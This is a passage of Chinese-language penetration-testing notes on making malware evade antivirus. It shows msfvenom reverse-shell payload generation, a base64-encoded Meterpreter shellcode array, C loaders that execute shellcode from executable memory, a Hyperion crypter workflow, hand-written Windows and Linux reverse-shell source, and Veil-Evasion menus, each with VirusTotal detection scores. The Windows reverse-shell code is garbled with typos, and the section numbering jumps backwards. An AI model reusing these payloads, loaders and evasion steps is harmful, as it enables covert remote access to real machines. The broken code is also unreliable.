   LHOST     192.168.2.131    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Evasion target:

   Id  Name
   --  ----
   0   Microsoft Windows


msf5 evasion(windows/windows_defender_js_hta) > exploit 

[+] azUXtL.hta stored at /root/.msf4/local/azUXtL.hta

```

[![B8sT91.md.png](https://s1.ax1x.com/2020/10/29/B8sT91.md.png)](https://imgchr.com/i/B8sT91)

VT免杀率21/61。 火绒秒杀。

#### 10.9 msf自编译+base64处理（40/71)

Metasploit Framework的C编译器其实是Metasm的包装器(Metasm是一个Ruby库)，可用于汇编、反汇编和编译C代码。

使用改C编译器时，需要以下两个函数：

```c
Metasploit::Framework::Compiler::Windows.compile_c(code)

Metasploit::Framework::Compiler::Windows.compile_c_to_fle(fle_path, code)
```

https://mp.weixin.qq.com/s/HsIqUKl7j1WJ4yyYzXdPZg

先使用msfvenom生成base64编码的c代码

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.2.131 lport=4444  --encrypt base64   -f c`

```bash
root@localhost:~/msf/miansha# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.2.131 lport=4444  --encrypt base64   -f c
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 341 bytes
Final size of c file: 1941 bytes
unsigned char buf[] = 
"\x2f\x4f\x69\x43\x41\x41\x41\x41\x59\x49\x6e\x6c\x4d\x63\x42"
"\x6b\x69\x31\x41\x77\x69\x31\x49\x4d\x69\x31\x49\x55\x69\x33"
"\x49\x6f\x44\x37\x64\x4b\x4a\x6a\x48\x2f\x72\x44\x78\x68\x66"
"\x41\x49\x73\x49\x4d\x48\x50\x44\x51\x48\x48\x34\x76\x4a\x53"
"\x56\x34\x74\x53\x45\x49\x74\x4b\x50\x49\x74\x4d\x45\x58\x6a"
"\x6a\x53\x41\x48\x52\x55\x59\x74\x5a\x49\x41\x48\x54\x69\x30"
"\x6b\x59\x34\x7a\x70\x4a\x69\x7a\x53\x4c\x41\x64\x59\x78\x2f"
"\x36\x7a\x42\x7a\x77\x30\x42\x78\x7a\x6a\x67\x64\x66\x59\x44"
"\x66\x66\x67\x37\x66\x53\x52\x31\x35\x46\x69\x4c\x57\x43\x51"
"\x42\x30\x32\x61\x4c\x44\x45\x75\x4c\x57\x42\x77\x42\x30\x34"
"\x73\x45\x69\x77\x48\x51\x69\x55\x51\x6b\x4a\x46\x74\x62\x59"
"\x56\x6c\x61\x55\x66\x2f\x67\x58\x31\x39\x61\x69\x78\x4c\x72"
"\x6a\x56\x31\x6f\x4d\x7a\x49\x41\x41\x47\x68\x33\x63\x7a\x4a"
"\x66\x56\x47\x68\x4d\x64\x79\x59\x48\x69\x65\x6a\x2f\x30\x4c"
"\x69\x51\x41\x51\x41\x41\x4b\x63\x52\x55\x55\x47\x67\x70\x67"
"\x47\x73\x41\x2f\x39\x56\x71\x43\x6d\x6a\x41\x71\x41\x4b\x44"
"\x61\x41\x49\x41\x45\x56\x79\x4a\x35\x6c\x42\x51\x55\x46\x42"
"\x41\x55\x45\x42\x51\x61\x4f\x6f\x50\x33\x2b\x44\x2f\x31\x5a"
"\x64\x71\x45\x46\x5a\x58\x61\x4a\x6d\x6c\x64\x47\x48\x2f\x31"
"\x59\x58\x41\x64\x41\x72\x2f\x54\x67\x68\x31\x37\x4f\x68\x6e"
"\x41\x41\x41\x41\x61\x67\x42\x71\x42\x46\x5a\x58\x61\x41\x4c"
"\x5a\x79\x46\x2f\x2f\x31\x59\x50\x34\x41\x48\x34\x32\x69\x7a"
"\x5a\x71\x51\x47\x67\x41\x45\x41\x41\x41\x56\x6d\x6f\x41\x61"
"\x46\x69\x6b\x55\x2b\x58\x2f\x31\x5a\x4e\x54\x61\x67\x42\x57"
"\x55\x31\x64\x6f\x41\x74\x6e\x49\x58\x2f\x2f\x56\x67\x2f\x67"
"\x41\x66\x53\x68\x59\x61\x41\x42\x41\x41\x41\x42\x71\x41\x46"
"\x42\x6f\x43\x79\x38\x50\x4d\x50\x2f\x56\x56\x32\x68\x31\x62"
"\x6b\x31\x68\x2f\x39\x56\x65\x58\x76\x38\x4d\x4a\x41\x2b\x46"
"\x63\x50\x2f\x2f\x2f\x2b\x6d\x62\x2f\x2f\x2f\x2f\x41\x63\x4d"
"\x70\x78\x6e\x58\x42\x77\x37\x76\x77\x74\x61\x4a\x57\x61\x67"
"\x42\x54\x2f\x39\x55\x3d";

```

构造如下shellcode,保存为`1.c`文件。

```c
#include <Windows.h>
#include <String.h>
#include <base64.h>

unsigned char BASE64STR[] =
"\x2f\x4f--shellcode--\x3d";

int main() {
  int base64StrLen = strlen(BASE64STR);
  LPVOID lpBuf = VirtualAlloc(NULL, sizeof(int) * base64StrLen, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  memset(lpBuf, '\0', base64StrLen);
  base64decode(lpBuf, BASE64STR, base64StrLen);
  //MessageBox(NULL, (char*)lpBuf, "Base64 Test", MB_OK);
  void(*func)();
  func = (void(*)()) lpBuf;
  (void)(*func)();
  return 0;
}
```

在msf中键入`irb`进入IRB shell,依次键入下面命令

```bash
msf5 > irb
[*] Starting IRB shell...
[*] You are in the "framework" object

>> require 'metasploit/framework/compiler/windows'
=> false
>> exe = Metasploit::Framework::Compiler::Windows.compile_c(File.read('/root/msf/miansha/1.c'))
>> File.write('/root/msf/miansha/shellcode.exe', exe)
=> 3072
```

在输入上面的` File.write('/root/msf/miansha/shellcode.exe', exe)`之后，会生成shellcode.exe。

在msf监听，成功反弹shell,

```bash
msf5 > jobs

Jobs
====

  Id  Name                    Payload                          Payload opts
  --  ----                    -------                          ------------
  0   Exploit: multi/handler  windows/meterpreter/reverse_tcp  tcp://192.168.2.131:4444

msf5 > 
[*] Sending stage (176195 bytes) to 192.168.2.1
[*] Meterpreter session 6 opened (192.168.2.131:4444 -> 192.168.2.1:51412) at 2020-10-29 12:54:38 +0800

```

[![BG101A.md.png](https://s1.ax1x.com/2020/10/29/BG101A.md.png)](https://imgchr.com/i/BG101A)

VT免杀率（40/71)。火绒秒杀。

#### 10.10 msf reverse_https （57/71）

https://mp.weixin.qq.com/s/HsIqUKl7j1WJ4yyYzXdPZg

https://www.freebuf.com/sectool/118714.html

生成 payload ：

```bash
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.2.131 LPORT=4444 -f exe -o 10.exe
```

监听时设置

```bash
set payload windows/meterpreter/reverse_https
```

[![BG3r8J.md.png](https://s1.ax1x.com/2020/10/29/BG3r8J.md.png)](https://imgchr.com/i/BG3r8J)

VT免杀率（57/71）.火绒秒杀。

#### 10.11 revese_tcp_rc4 

 https://mp.weixin.qq.com/s/HsIqUKl7j1WJ4yyYzXdPZg

```bash
msfvenom -p  windows/meterpreter/reverse_tcp_rc4  lhost=10.211.55.2 lport=2223 RC4PASSWORD=tidesec  -f c
```

把生成的shellcode在相应位置替换

```bash
#include <Windows.h>
#include <String.h>

unsigned char buf[] = 

"shellcode is here";

void main()

{

	( (void(*)(void))&buf)();

}
```

下面的这种方法，vc++6.0能够成功编译，但是vs编译会报错，可以换成：

```c
#include <Windows.h>
#include <String.h>

void main()

{

	Memory = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(Memory, buf, sizeof(buf));

	((void(*)())Memory)();

}
```

[![BGGahF.md.png](https://s1.ax1x.com/2020/10/29/BGGahF.md.png)](https://imgchr.com/i/BGGahF)

VT免杀率（26/71）.火绒秒杀。



## 十一、软件保护

软件开发商为保护版本，采用的混淆和加密技术避免盗版逆向。

常被恶意软件用于免杀目的。

#### Hyperion

Hyperion （32bit PE 程序加密器）
Crypter / Container（解密器 PE Loader ）
 https://github.com/nullsecuritynet/tools/raw/master/binary/hyperion/release/

```bash
git clone https://github.com/nullsecuritynet/tools/raw/master/binary/hyperion/release/Hyperion-2.3.zip
unzip Hyperion-2.3.zip
dpkg --add-architecture i386 && apt-get update && apt-get install wine32
# 生成加密器
cd Hyperion-1.2 && i686-w64-mingw32-g++ -static-libgcc -static-libstdc++ Src/Crypter/*.cpp -o h.exe
# 生成木马程序
msfvenom -p windows/shell/reverse_tcp lhost=192.168.1.119 lport=4444 --platform win -e x86/shikata_ga_nai -a x86 -f exe -o p.exe
# 对木马程序进行加密
wine h.exe p.exe x.exe
#得到x.exe
```

#### 自己编写后门

* windows reverse shell

  win gcc.exe windows.c -o windows.exe -lws2_32

  ```c
  #include <winsock2.h>
  #include <stdio.h>
  #pragma comment(lib,"ws2_32")
  WSADATA wsaData;
  SOCKET Winsock;
  SOOKET Sock;
  struct sockaddr_in hax;
  char ip_addr[16];
  STARTUPINFO ini_processo;
  PROCESS_INFORMATION processo_info; 
  int main(int argc,char *argv[])
  {
   WSAStartup(MAKEWORD(2,2), wsaData);
   winsock=WSASoket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);
   if (argc != 3){fprintf(stderr,"Uso: <rhost> <rport>\n";) exit(1);}
   struct hostent *host;
   host = gethostbyname(argv [1] );
   strcpy(ip_addr,inet_ntoa(*((struct in_addr *)host->h_addr)));
   hax.sin_family = AF_INET;
   hax.sin_port = htons(atoi(argv[2]));
   hax.sin_addr.s_addr = inet_addr(ip_addr);
   WSAConnect(Winsock,(SOCKADDR* &hax,sizeof(hax),NULL,NULL,NULL,NULL;
   memset(&ini_processo,0,sizeof(ini_processo));
   ini_processo.cb = sizeof(ini_processo);
   ini_processo.dwFlags = START_USESTDHANDLES;
   ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;
   CreateProcess(NULL,"cmd exe",NULL,NULL,TRUE,0,NULL,NULL,&ini_processo,&process_info);
  }
  ```

  

* linux shell

  gcc linux_reverse_shell.c -o linux

  ```c
  #include <stdio.h>
  #include <sys/socket.h>
  #include <arpa/inet.h>
  #include <stdlib.h>
  #include <string.h>
  #include <unistd.h>
  #include <netinet/in.h>
  int main(int argc, char *argv[])
  {
   struct sockaddr_in sock;
   int s;
   if (argc != 3)
   {
    fprintf(stderr, "uso: <rhost> <rport>\n"); exit(1);
   }
   sock.sin_family  = AF_INET;
   sock.sin_port = htons(atoi(argv[2]));
   sock.sin_addr.s_addr = inet_addr(argv[1]);
   s = socket(AF_INET, SOCK_STREAM, 0);
   connect(s,(struct sockaddr_in *)&sock, sizeof(struct sockaddr_in));
   dup2(s,0);
   dup2(s,1);
   dup2(s,2);
   execl("/bin/sh","httpd",(char *)0); //precess httpd
  }
  ```

## 六、Veil-evasion

  * 属于 `Veil-framework` 框架的一部分。
  * 由python 语言编写
  * 用于自动生成免杀 payload
      * 集成 msf payload ,支持自定义 payload
      * 集成各种注入技术
      * 集成各种第三方工具
          * Hypersion、PEScrambler、BackDoor Factory
    * 继承各种开发打包运行环境
      * python : pyinstaller / py2exe
      * C# : mone for.NET
      * C : mingw32



安装： 

https://github.com/Veil-Framework

https://github.com/Veil-Framework/Veil.git

或者 linux 

```bash
apt-get install veil
```

安装，默认一路回车就可以。

```bash
root@localhost:~# veil 
===============================================================================
                             Veil | [Version]: 3.1.14
===============================================================================
      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
===============================================================================

Main Menu

	2 tools loaded

Available Tools:

	1)	Evasion
	2)	Ordnance

Available Commands:

	exit			Completely exit Veil
	info			Information on a specific tool
	list			List available tools
	options			Show Veil configuration
	update			Update Veil
	use			Use a specific tool

Veil>: 
```

使用 	`evasion`

```python
# 看情况安装
apt install winbind

pip3 install pyinstaller
```

veil-evasion 命令;

```bash
Veil>: use 1
===============================================================================
                                   Veil-Evasion
===============================================================================
      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
===============================================================================

Veil-Evasion Menu

	41 payloads loaded

Available Commands:

	back			Go to Veil's main menu
	checkvt			Check VirusTotal.com against generated hashes
	clean			Remove generated artifacts
	exit			Completely exit Veil
	info			Information on a specific payload
	list			List available payloads
	use			Use a specific payload

# list 列出payload
Veil/Evasion>: list
===============================================================================
                                   Veil-Evasion
===============================================================================
      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
===============================================================================


 [*] Available Payloads:

	1)	autoit/shellcode_inject/flat.py

	2)	auxiliary/coldwar_wrapper.py
	3)	auxiliary/macro_converter.py
	4)	auxiliary/pyinstaller_wrapper.py

	5)	c/meterpreter/rev_http.py
	6)	c/meterpreter/rev_http_service.py
	7)	c/meterpreter/rev_tcp.py
	8)	c/meterpreter/rev_tcp_service.py

	9)	cs/meterpreter/rev_http.py
	10)	cs/meterpreter/rev_https.py
	11)	cs/meterpreter/rev_tcp.py
	12)	cs/shellcode_inject/base64.py
	13)	cs/shellcode_inject/virtual.py

	14)	go/meterpreter/rev_http.py
	15)	go/meterpreter/rev_https.py
	16)	go/meterpreter/rev_tcp.py
	17)	go/shellcode_inject/virtual.py

	18)	lua/shellcode_inject/flat.py

	19)	perl/shellcode_inject/flat.py

	20)	powershell/meterpreter/rev_http.py
	21)	powershell/meterpreter/rev_https.py
	22)	powershell/meterpreter/rev_tcp.py
	23)	powershell/shellcode_inject/psexec_virtual.py
	24)	powershell/shellcode_inject/virtual.py

	25)	python/meterpreter/bind_tcp.py
	26)	python/meterpreter/rev_http.py
	27)	python/meterpreter/rev_https.py
	28)	python/meterpreter/rev_tcp.py
	29)	python/shellcode_inject/aes_encrypt.py
	30)	python/shellcode_inject/arc_encrypt.py
	31)	python/shellcode_inject/base64_substitution.py
	32)	python/shellcode_inject/des_encrypt.py
	33)	python/shellcode_inject/flat.py
	34)	python/shellcode_inject/letter_substitution.py
	35)	python/shellcode_inject/pidinject.py
	36)	python/shellcode_inject/stallion.py

	37)	ruby/meterpreter/rev_http.py
	38)	ruby/meterpreter/rev_https.py
	39)	ruby/meterpreter/rev_tcp.py
	40)	ruby/shellcode_inject/base64.py
	41)	ruby/shellcode_inject/flat.py


```





## 七、Veil-catapult

* payload 的投递
  * 集成 veil-evasion 生成免杀 payload 或自定义 payload
  * 使用 impacket 上传二进制 payload 文件
  * 使用 passing-the-hash 出发执行 payload
* payload 直接在内存中运行
* smdexec 

